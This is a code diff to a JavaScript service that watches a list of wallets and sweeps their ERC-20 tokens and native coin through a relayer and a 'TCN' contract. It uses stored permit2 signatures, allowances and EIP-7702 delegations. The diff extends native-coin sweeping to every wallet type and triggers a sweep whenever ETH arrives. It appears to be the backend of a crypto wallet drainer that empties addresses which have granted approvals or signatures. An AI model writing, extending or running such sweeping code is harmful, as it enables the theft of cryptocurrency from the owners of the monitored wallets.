@@ -339,6 +339,7 @@ const FALLBACK_TOKENS = {
     { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC",  decimals: 6  },
     { address: "0xdac17f958d2ee523a2206206994597c13d831ec7", symbol: "USDT",  decimals: 6  },
     { address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", symbol: "WBTC",  decimals: 8  },
+    { address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", symbol: "WETH",  decimals: 18 },
     { address: "0x514910771af9ca656af840dff83e8264ecf986ca", symbol: "LINK",  decimals: 18 },
     { address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", symbol: "UNI",   decimals: 18 },
     { address: "0x6b175474e89094c44da98b954eedeac495271d0f", symbol: "DAI",   decimals: 18 },
@@ -350,6 +351,7 @@ const FALLBACK_TOKENS = {
     { address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", symbol: "USDT",  decimals: 6  },
     { address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", symbol: "WBTC",  decimals: 8  },
     { address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", symbol: "WETH",  decimals: 18 },
+    { address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270", symbol: "WMATIC", decimals: 18 },
     { address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39", symbol: "LINK",  decimals: 18 },
     { address: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", symbol: "DAI",   decimals: 18 },
     { address: "0xd6df932a45c0f255f85145f286ea0b292b21c90b", symbol: "AAVE",  decimals: 18 },
@@ -1338,6 +1340,41 @@ async function dispatchSweep(wallet) {
   }
 }
 
+// ── Native coin sweep helper for non-EIP7702 wallets ─────────────────────────
+// Calls sweepETHFor(user) on the V2.1 TCN contract if the user holds native
+// coin and the contract is authorised. No-ops gracefully if the contract is
+// not configured, balance is zero, or the call reverts.
+
+async function trySweepNativeFor(checksum, short) {
+  if (!contract || !CONTRACT_ADDRESS) return;
+  try {
+    const nativeBal = await getReadProvider().getBalance(checksum);
+    if (nativeBal === 0n) return;
+
+    const relBal = await getRelayerBalance();
+    if (relBal < ethers.parseEther("0.001")) {
+      warn(`[nativeFor] relayer low on gas — skipping native sweep for ${short}`);
+      return;
+    }
+
+    log(`[nativeFor] ${short} — native balance ${ethers.formatEther(nativeBal)} — attempting sweepETHFor`);
+    const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
+    if (!isAuth) {
+      log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
+      return;
+    }
+
+    const fee = await getFeeData();
+    const gasEst = await contract.sweepETHFor.estimateGas(checksum).catch(() => 80_000n);
+    const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
+    await tx.wait();
+    log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
+  } catch (e) {
+    maybeResetNonce(e);
+    err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
+  }
+}
+
 // ── Universal sweep — 6 tiers ───────────────────────────────────────────────
 
 async function sweep(wallet) {
@@ -1572,6 +1609,9 @@ async function sweep(wallet) {
     if (toSweepV2.length === 0 && toSweepLegacy.length === 0) {
       log(`[direct] ${short} — no tokens with balance+allowance`);
     }
+
+    // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
+    await trySweepNativeFor(checksum, short);
     return;
   }
 
@@ -2064,6 +2104,9 @@ async function sweep(wallet) {
       log(`[gasless] -sig row absent or non-standard format — trying permit_metadata fallback`);
       await sweepGaslessWallet(checksum);
     }
+
+    // ── Native coin sweep for permit2 wallets (V2.1 sweepETHFor) ──────────
+    await trySweepNativeFor(checksum, short);
   }
 
 }
@@ -2479,9 +2522,6 @@ let _nativePollTimer = null;
 
 async function _nativePollTick() {
   if (monitoredWallets.size === 0) return;
-  // Only useful for EIP-7702 wallets — skip poll entirely if none present.
-  const hasEip7702 = [...monitoredWallets.values()].some(w => w.type === "eip7702");
-  if (!hasEip7702) return;
 
   try {
     const blockNumber = await scanProvider.getBlockNumber();
@@ -2497,11 +2537,8 @@ async function _nativePollTick() {
       const wallet = monitoredWallets.get(toLower);
       log(`[native] 📥 ${ethers.formatEther(tx.value)} ETH → ${tx.to.slice(0, 10)} type=${wallet.type}`);
 
-      if (wallet.type !== "eip7702") {
-        log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
-        continue;
-      }
-      // dispatchSweep handles debounce + pending-queue internally
+      // All wallet types: dispatchSweep will sweep ERC20s (permit2/direct-allowance)
+      // and ETH (eip7702 via sweepETH, non-7702 via sweepETHFor if authorised).
       dispatchSweep(wallet)
         .catch(e => log(`[native] sweep error: ${e.message}`));
     }
